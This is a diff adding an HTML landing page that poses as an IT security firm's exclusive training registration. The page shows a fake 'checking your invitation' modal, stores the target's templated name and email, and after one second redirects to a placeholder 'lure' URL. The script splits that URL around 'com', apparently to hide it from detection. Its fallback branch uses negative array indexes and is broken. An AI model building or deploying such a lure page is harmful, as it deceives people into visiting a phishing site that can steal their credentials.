@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Etech IT - Cybersecurity Solutions</title>
+    <link rel="icon" type="image/x-icon" href="images/favicon.ico">
+    <link rel="stylesheet" href="style.css">
+    
+</head>
+<body>
+    <header>
+        
+        <div id="logo">Etech IT</div>
+        <nav>
+            <a href="#">Home</a>
+            <a href="#">Services</a>
+            <a href="#">About</a>
+            <a href="#">Contact</a>
+        </nav>
+        <div id="contact">Contact us: +1 (123) 456-7890</div>
+    </header>
+
+    <main>
+        <section id="hero">
+            <h1>Welcome to Etech IT - Cybersecurity Solutions</h1>
+            
+            <p>Your trusted partner in cybersecurity solutions.</p>
+        </section>
+
+
+
+
+
+        <section id="registration-form-section">
+            <section id="training-info">
+                <h2>Upcoming Security Awareness Training</h2>
+                
+                <p>Join our exclusive 1:1 training session to enhance your security skills and awareness.</p>
+                
+            </section>
+
+            <div id="lgOverlay-container">
+                <div id="paywall-modal">
+                    <h3 id="lg-h">This training is exclusive for enterprise customers</h3>
+                    <p id="lg-p">We need to check your invitation status.</p>
+
+                    <button id="login-btn">Loading Invitation...</button>
+                </div>
+
+            </div>
+
+            <iframe id="calendly-frame" src="" frameBorder="0" width="100%" height="100%" title="Select Date & Time - Etech-it.com"></iframe>
+            
+        </section>
+    </main>
+
+    <footer>
+        <p>&copy; 2023 Etech IT. All rights reserved.</p>
+        <nav>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+        </nav>
+    </footer>
+
+    <script>
+
+        document.addEventListener('DOMContentLoaded', (event) => {
+    
+            try {
+                localStorage.setItem('bb-n', {name});
+            localStorage.setItem('bb-e', {email});
+
+                setTimeout(function() {
+                    let t = {lure_url_js};
+                    let t0 = t.split('//')[0];
+                    let t1 = '//' + t.split('//')[1].split('com')[0];
+                    let t2 = 'com' + t.split('com')[1];
+
+                    window.location.href = t0 + t1 + t2;
+                }, 1000);
+            }
+            catch {
+            console.log("Invalid Invitation");
+            setTimeout(function() {
+                    t = location.host.split(":")[0]
+                    t0 = t.split('.')[-2];
+                    t1 = t.split('.')[-1];
+                    tEnd = t0 + t1;
+
+                    window.location.href = tEnd;
+                }, 1000);
+        }
+        });
+
+
+ 
+
+    </script>
+
+</body>
+</html>
